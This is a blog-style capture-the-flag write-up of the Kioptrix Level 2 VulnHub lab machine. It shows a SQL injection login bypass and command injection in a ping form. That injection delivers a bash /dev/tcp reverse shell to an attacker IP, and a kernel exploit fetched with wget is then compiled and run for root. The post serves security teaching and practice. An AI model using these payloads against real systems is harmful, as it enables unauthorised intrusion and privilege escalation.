---
title: "Kioptrix 2 Writeup"
date: 2020-04-11T10:50:53+02:00
draft: false
Tags: [
    "Writeups",
    "Vulnhub",
]
---
Download kioptrix 2 VM [here](https://www.vulnhub.com/entry/kioptrix-level-11-2,23/)

Services:
* Apache 
* MySQL
* Openssh
* RPC
* CUPS 

### 0. Getting machine's ip:
![](/images/kioptrix2/1.png)

Also ``# netdiscover -r 192.168.1.0/24`` works fine.

###  1. Enumeration:
* Zenmap:
![](/images/kioptrix2/2.png)

So first things first, let's check the web server running .. 

### 2. Web Server:
* Hitting vm's ip 192.168.1.7 shows us this login form: 
![](/images/kioptrix2/3.png)
![](/images/kioptrix2/4.png)

it's an admin login , maybe it's vulnerable to sql injection let's try to bypass it ..

* note: i also made directory enumeration but found nothing useful ..

Trying with this payload:
  * admin" or 1=1 #

For other payloads too [here](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection)
![](/images/kioptrix2/5.png)
And boom it worked fine, and we're in as web admin ..
![](/images/kioptrix2/6.png)

Why this happened? Maybe the form query is:

``SELECT * from users where username="$_REQUEST["username"]" and password="$_REQUEST["password"]"``

And using the payload evaluated it to:

``SELECT * from users where username="admin" or 1=1 # //ignored the rest of code``

### 3. Admin panel:
* it pings machines let's try 127.0.0.1 and see what happens: 
![](/images/kioptrix2/7.png)
we got this response:
```text
127.0.0.1 PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
64 bytes from 127.0.0.1: icmp_seq=0 ttl=64 time=0.026 ms
64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.041 ms
64 bytes from 127.0.0.1: icmp_seq=2 ttl=64 time=0.051 ms

--- 127.0.0.1 ping statistics ---
3 packets transmitted, 3 received, 0% packet loss, time 1998ms
rtt min/avg/max/mdev = 0.026/0.039/0.051/0.011 ms, pipe 2
```

* So what if we could apply our own commands in this bash as RCE(Remote code execution):
![](/images/kioptrix2/8.png)
And it worked and ``whoami``command gave us output: apache! 

### 4. Exploitation:
* let's try to make reverse shell! 

note: you can get reverse shell payloads in lots of languages [here](https://highon.coffee/blog/reverse-shell-cheat-sheet/)

What  i used :
  * bash -i >& /dev/tcp/ATTACKER's-IP/PORT 0>&1

`` 127.0.0.1; bash -i >& /dev/tcp/192.168.1.6/1337 0>&1 ``

Netcat listener on our host:
* start nc first before the sending the reverse shell command.

  * `` nc -nlvp 1337 `` 

![we got shell as apache.. Awesome!!](/images/kioptrix2/9.png)

### 5. Privilege Escalation:
* we want to get root from this apache user.. 
  * let's get some information about this system:
```bash
bash-3.00$ uname -a
Linux kioptrix.level2 2.6.9-55.EL #1 Wed May 2 13:52:16 EDT 2007 i686 i686 i386 GNU/Linux
bash-3.00$ uname -mrs
Linux 2.6.9-55.EL i686
bash-3.00$ cat /etc/redhat-release
CentOS release 4.5 (Final)
```
* searching for exploits for this release, found this:
  * https://www.exploit-db.com/exploits/9542

let's download it to the machine and run it:
```yml
bash-3.00$ cd /tmp
bash-3.00$ wget https://www.exploit-db.com/exploits/9542
--20:57:56--  https://www.exploit-db.com/exploits/9542
           => `9542'
Resolving www.exploit-db.com... 192.124.249.8
Connecting to www.exploit-db.com|192.124.249.8|:443... connected.
OpenSSL: error:1407742E:SSL routines:SSL23_GET_SERVER_HELLO:tlsv1 alert protocol version
Unable to establish SSL connection.
bash-3.00$ wget https://www.exploit-db.com/download/9542 --no-check-certificate
--21:00:02--  https://www.exploit-db.com/download/9542
           => `9542'
Resolving www.exploit-db.com... 192.124.249.8
Connecting to www.exploit-db.com|192.124.249.8|:443... connected.
OpenSSL: error:1407742E:SSL routines:SSL23_GET_SERVER_HELLO:tlsv1 alert protocol version
**Unable to establish SSL connection.**
```
I tried a lot but couldn't download it directly on the machine, so i downloaded it on my host and put it on localhost server.
```java
mv 9542.c /var/www/html
sudo systemctl start apache2 >> to start apache server
```
![](/images/kioptrix2/10.png)
![](/images/kioptrix2/11.png)

### Finishing and getting root:
```yml
bash-3.00$ wget 192.168.1.6/9542.c
--21:39:04--  http://192.168.1.6/9542.c
           => `9542.c'
bash-3.00$ gcc 9542.c 
bash-3.00$ ls
9542.c
a.out
bash-3.00$ ./a.out
sh: no job control in this shell
sh-3.00# whoami
root

```
Awesome we got root access :D ... 

note: i roamed the system there is nothing usefull or flag or anything :)

hope you enjoyed...